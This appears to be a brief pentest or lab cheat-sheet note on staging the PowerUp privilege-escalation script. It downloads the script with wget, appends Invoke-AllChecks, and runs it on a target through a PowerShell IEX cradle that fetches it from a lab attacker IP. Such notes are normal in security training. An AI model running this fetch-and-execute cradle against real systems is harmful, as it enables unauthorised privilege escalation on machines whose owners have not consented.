___

https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

```bash
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/PowerUp.ps1
```

Add last line

```
Invoke-Allchecks
```


```ps
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.10/PowerUp.ps1')
```
